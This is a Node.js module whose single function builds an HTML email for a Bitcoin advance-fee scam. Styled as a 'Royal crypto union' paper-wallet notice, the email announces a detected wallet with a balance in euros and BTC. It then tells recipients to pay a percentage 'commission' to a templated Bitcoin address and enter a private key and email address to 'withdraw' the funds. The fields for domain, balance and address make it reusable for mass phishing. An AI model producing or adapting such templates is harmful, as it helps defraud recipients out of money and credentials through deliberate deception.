function generateHTML(
  domain,
  balanceEuro,
  balance,
  bitcoin_address,
  bitcoin_img,
  domainHeader,
  domainFooter,
  domainLink,
  precent
) {
  const output = `<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>${domain}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    </head>
    <body style="margin: 0; padding: 0;">
    <table style="margin:0 auto;padding:0;box-sizing:border-box;background:#fff;width:100%;max-width:700px;font-size:14px;line-height:1.4;font-family:Arial,sans-serif;color:#000;letter-spacing:.02em;text-align:left;border:none;border-collapse:collapse;">
        <thead style="display:flex;align-items:center;justify-content:center;margin:0;padding:0;box-sizing:border-box;display: flex; align-items: center; justify-content: center;">
          <tr style="margin:0 auto;padding:0;box-sizing:border-box">
            <th style="margin:0;padding:20px;box-sizing:border-box">
              <a href="${domainLink}" style="margin:0;padding:0;box-sizing:border-box;color:#000;text-decoration:none;display:inline-block;text-align:left;vertical-align:middle" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://royalcoinunion.com/&amp;source=gmail&amp;ust=1675970878005000&amp;usg=AOvVaw2WZsG7mIr_kjZE7qSrxKU0">
              <figure style="display:flex;align-items:center;justify-content:center;">  
              <img src="${domainLink}/img/ethereum.gif" alt="Royal crypto union" style="margin:0 auto;padding:0;box-sizing:border-box;width:70px;height:auto;display:inline-block;vertical-align:top;text-align: center;" class="CToWUd" data-bit="iit">
            </figure>
                <span style="margin:0;padding:15px 0 0;box-sizing:border-box;display:inline-block;font-weight:bold;font-size:14px;vertical-align:top">
                  <span style="margin:0;padding:0;box-sizing:border-box;display:block;color:#000;text-align: center;">${domainHeader} wallet</span>
                  <span style="margin:0;padding:0;box-sizing:border-box;display:block;font-size:72%;color:#ccc">Print your coins secure offline</span>
                </span>
              </a>
            </th>
          </tr>
        </thead>
        <tbody style="margin:0;padding:0;box-sizing:border-box">
          <tr style="margin:0;padding:0;box-sizing:border-box">
            <td style="margin:0;padding:20px;box-sizing:border-box;text-align:center">
              <h1 style="margin:0;padding:0;box-sizing:border-box;color:#58b476;font-size:18px">Business Bitcoin paper wallet detected!</h1>
              <p style="margin:0;padding:0;box-sizing:border-box;color:#999;font-size:12px">
                <strong style="margin:0;padding:0;box-sizing:border-box">Bitcoin paper wallet NO. AA22V3R2BRB53</strong>
              </p>
              <p style="margin:0;padding:0;box-sizing:border-box;font-size:18px">
                <strong style="margin:0;padding:0;box-sizing:border-box">Deposited by Bitcoin ATM receipt<br style="margin:0;padding:0;box-sizing:border-box">(transaction ID - SD1V89W533SF5-D9N1)</strong>
              </p>
              <img src="${domainLink}/img/black-bitcoin.jpg" alt="" style="margin:20px auto;padding:0;box-sizing:border-box;width:100%;max-width:200px;display:block" class="CToWUd" data-bit="iit">
              <p style="margin:0 0 2px;padding:0;box-sizing:border-box;font-weight:bolder;font-size: 2.5rem;">Current Balance</p>
              <p style="margin:0;padding:0;box-sizing:border-box;color:#58b476;font-size:28px;font-weight:bolder;margin-bottom: 9px;">${balanceEuro} EUR</p>
              <p style="margin:0;padding:0;box-sizing:border-box;color:#000;font-size:28px;font-weight:bolder;margin-top: 9px;">=<br>${balance} BTC</p>
            </td>
          </tr>
          <tr style="margin:0;padding:0;box-sizing:border-box">
            <td style="margin:0;padding:20px;box-sizing:border-box">
              <ul style="margin:0 auto;padding:10px;box-sizing:border-box;background:#4f4f4f;line-height:1.5;color:#fff;border-radius:7px;list-style-type:none;width:100%;max-width:350px;font-size:12px">
                <li style="margin:0;padding:0;box-sizing:border-box">&gt; Scan Public Address QR code to deposit paper wallet or to check available balance.</li>
                <li style="margin:0;padding:0;box-sizing:border-box">&gt; PRIVATE key gives you complete access to your funds on Bitcoin paper wallet.</li>
                <li style="margin:0;padding:0;box-sizing:border-box">&gt; DO NOT REVEAL or SHARE THE PRIVATE KEY until you will withdraw funds from Bitcoin paper wallet to your own
                cryptocurrency wallet.</li>
                <li style="margin:0;padding:0;box-sizing:border-box">&gt; To withdraw funds from paper wallet you must pay a ${precent}% commission of the current amount on the Bitcoin paper
                wallet.</li>
              </ul>
            </td>
          </tr>
          <tr style="margin:0;padding:0;box-sizing:border-box">
            <td style="margin:0;padding:20px;box-sizing:border-box;text-align:center">
              <p style="margin:0 0 20px;padding:0;box-sizing:border-box;color:#677788;font-size:16px">To withdraw funds from paper wallet you must pay a ${precent}% commission of the current amount on the Bitcoin wallet.<br style="margin:0;padding:0;box-sizing:border-box">IMPORTANT! The secret Private key can be used only once,after that it will not be valid.</p>
              <p style="margin:0 0 20px;padding:0;box-sizing:border-box;color:#677788;font-size:16px">First, enter Private key from your printed BTC paper wallet and enter your own email address.To pay the commission,use a digital Bitcoin wallet,scan QR code,send the correct amount of the Bitcoin indicated in the form on website,double-check the Bitcoin address into which you need to pay commission.Once the ${precent}% commission fee has been paid ,click the button CONFIRM TRANSFER</p>
            </td>
          </tr>
          <tr style="margin:0;padding:0;box-sizing:border-box">
            <td style="margin:0;padding:20px;box-sizing:border-box">
              <div style="margin:0 0 20px;padding:0;box-sizing:border-box;text-align:center">
                <div style="margin:0;padding:0;box-sizing:border-box;width:100%;max-width:300px;display:inline-block;font-size:0;vertical-align:top">
                  <img src="${bitcoin_img}" alt="QR code" style="margin:0;padding:0;box-sizing:border-box;width:100%;height:auto;display:block" class="CToWUd a6T" data-bit="iit" tabindex="0"><div class="a6S" dir="ltr" style="opacity: 0.01;"><div id=":1zw" class="T-I J-J5-Ji aQv T-I-ax7 L3 a5q" title="Скачать" role="button" tabindex="0" aria-label="Скачать файл " jslog="91252; u014N:cOuCgd,Kr2w4b,xr6bB" data-tooltip-class="a1V"><div class="akn"><div class="aSK J-J5-Ji aYr"></div></div></div></div>
                </div>
              </div>
            </td>
          </tr>
          <tr style="margin:0;padding:0;box-sizing:border-box">
            <td style="margin:0;padding:20px;box-sizing:border-box">
              <div style="margin:0 0 10px;padding:0;box-sizing:border-box">
                <div style="margin:0 auto;padding:10px;box-sizing:border-box;width:100%;max-width:800px;min-height:60px;display:flex;border:1px solid #ccc;border-radius:10px">
                  <div style="margin:0;padding:0;box-sizing:border-box">
                    <p style="margin:0 0 5px;padding:0;box-sizing:border-box;display:block">Bitcoin address to pay a commission fee</p>
                    <p style="margin:0;padding:0;box-sizing:border-box;display:block;font-weight:bold;font-size:16px;word-break:break-all">${bitcoin_address}</p>
                  </div>
                  <img src="${domainLink}/img/bitcoin-logo.png" style="margin:0 0 0 auto;padding:0;box-sizing:border-box;width:40px;height:auto;display:block" class="CToWUd" data-bit="iit">
                </div>
              </div>
            </td>
          </tr>
          <tr style="margin:0;padding:0;box-sizing:border-box">
            <td style="margin:0;padding:20px;box-sizing:border-box;text-align:center">
              <p style="margin:0 0 20px;padding:0;box-sizing:border-box;color:#677788;font-size:16px">
                <strong style="margin:0;padding:0;box-sizing:border-box">After 2 confirmations on blockchain the commission fee will be confirmed,transfer invoice and activation code will be send to email</strong>
              </p>
            </td>
          </tr>
        </tbody>
        <tfoot style="margin:0;padding:0;box-sizing:border-box">
          <tr style="margin:0;padding:0;box-sizing:border-box">
            <td style="margin:0;padding:20px;box-sizing:border-box;text-align:center">
              <a href="${domainLink}" style="margin:0 0 10px;padding:0;box-sizing:border-box;color:#000;text-decoration:none;display:inline-block;text-align:left;vertical-align:middle" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://royalcoinunion.com/&amp;source=gmail&amp;ust=1675970878005000&amp;usg=AOvVaw2WZsG7mIr_kjZE7qSrxKU0">
              <figure style="display:flex;align-items:center;justify-content:center;">  
                  <img src="${domainLink}/img/ethereum.gif" alt="Royal crypto union" style="margin:0;padding:0;box-sizing:border-box;width:70px;height:auto;margin-right:2px;display:inline-block;vertical-align:top" class="CToWUd" data-bit="iit">
                </figure>  
                <span style="margin:0;padding:15px 0 0;box-sizing:border-box;display:inline-block;font-weight:bold;font-size:14px;vertical-align:top">
                  <span style="margin:0;padding:0;box-sizing:border-box;display:block;color:#000">${domainFooter} wallet</span>
                  <span style="margin:0;padding:0;box-sizing:border-box;display:block;font-size:72%;color:#ccc">Print your coins secure offline</span>
                </span>
              </a>
              <p style="margin:0 0 4px;padding:0;box-sizing:border-box;font-size:12px;text-align:center">We're proud to be part of the <a href="${domainLink}" style="margin:0;padding:0;box-sizing:border-box;color:#0052ea;text-decoration:none" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://royalcoinunion.com/&amp;source=gmail&amp;ust=1675970878006000&amp;usg=AOvVaw2FKJ4CW1IyoKWY9W3YD8zK"><b style="margin:0;padding:0;box-sizing:border-box">2% for impact</b></a> family.</p>
              <p style="margin:0 0 4px;padding:0;box-sizing:border-box;font-size:12px;text-align:center">© ${domainFooter} 2018. All rights reserved.</p>
            </td>
          </tr>
        </tfoot>
    </table>
    
    `;
  return output;
}

module.exports = {
  generateHTML,
};
